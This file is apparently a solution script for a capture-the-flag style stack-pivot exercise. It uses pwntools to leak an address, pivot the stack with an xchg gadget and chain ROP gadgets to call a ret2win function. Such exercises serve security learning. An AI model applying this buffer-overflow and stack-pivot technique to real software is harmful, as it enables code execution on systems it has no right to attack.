from pwn import *
import gadgets

binary = './pivot'
padding = 40

#  bss_addr = 0x0000000000601060
bss_addr = 0x0000000000601050

def hex2int(s):
    return int(s[2:], 16)

func_diff = 0xabe - 0x970


# end of content
p = process(binary)
r = p.recvuntil('> ')
print(r.decode())
base_addr = hex2int(r.decode().strip().splitlines()[-3].split(': ')[1])
log.info('base: ' + hex(base_addr))

payload_smash = b''
payload_smash += gadgets.pop_rax(base_addr)
payload_smash += p64(0x0000000000400b02) # xchg rax, rsp; ret;

payload = p64(0x00400850) # call foothold

# get real address of foothold, store in rax
payload += gadgets.pop_rax(0x602048)
payload += p64(0x0000000000400b05) # mov rax, qword ptr [rax]; ret;

# add offset to rax, stored ret2win func addr
payload += gadgets.pop_rbp(func_diff)
payload += p64(0x0000000000400b09) # add rax, rbp; ret;

# just call
payload += p64(0x000000000040098e) # call rax


p.sendline(payload)
p.recvuntil('> ')
p.sendline(padding * b'a' + payload_smash)
#  p.interactive()
p.wait()
print(p.recvall().decode())

with open('payload.bin', 'wb') as f:
    f.write(payload + b'\n')
    f.write(b'a' * padding + payload_smash + b'\n')
